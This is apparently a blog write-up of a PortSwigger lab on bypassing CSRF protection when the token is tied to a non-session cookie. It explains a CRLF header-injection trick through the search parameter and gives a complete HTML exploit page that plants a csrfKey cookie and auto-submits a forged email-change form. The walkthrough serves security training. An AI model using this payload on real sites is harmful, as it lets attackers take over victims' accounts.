+++
date = '2026-06-04T14:30:16+08:00'
draft = false
title = 'CSRF token is tied to a non-session cookie'
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = 'Very interesting problem. Highly suggest reviewing'
showLastUpdated = true
+++
The key idea is that there are two separate cookies per se, one for session and the other for generating CSRF tokens. They are not tied to eachother so one can simply get a pair of tokens, then apply that to the payload. The following intercept in Burp shows clearly the pair:
![](/images/54235a99-e484-4610-a7c3-3c3c58778fe8.jpg)

I took a lot of time on this because I thought we can remotely set cookies to the main site, *which surprisingly cannot be done*. Turns out we have to tell the main site to set our cookies for us, in this case we will be using the search function.
![](/images/a2d50b58-888b-46ad-9012-a8769cffda9f.jpg)

Normally, when we want to search something, the URL will be something like:
```
/?search=cutepets
```
We can exploit this by injecting what are known as **Carriage Return / Line Feed (CRLF) Injections**. Basically there exists certain URL-encoded values such as:
- `%20` = A space character.
- `%3b` = A semicolon ( ; ).
- `%0d` = Carriage Return (CR) — essentially moving the cursor to the beginning of the line.
- `%0a` = Line Feed (LF) — essentially pressing "Enter" to go down one line.

By sneaking in `%0d%0a` into our search term, we are essentially telling the web app to go down one line, then set our pair of tokens. The hijacked request will look something like this:
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=WX6...
```

Applying what we learn above, we can craft our payload as follow. Here I used an `<img>` tag with `onerror` attribute to automatically submit the form. Very interesting problem.
```html
<html>
<body>

<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@hotmail.snail">
<input type="hidden" name="csrf" value="<csrf-token-here>">
</form>

<img src="https://<lab-id>.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=<csrf-key-here>%3b%20SameSite=None" onerror="document.getElementById('attack').submit()">

</body>
</html>
```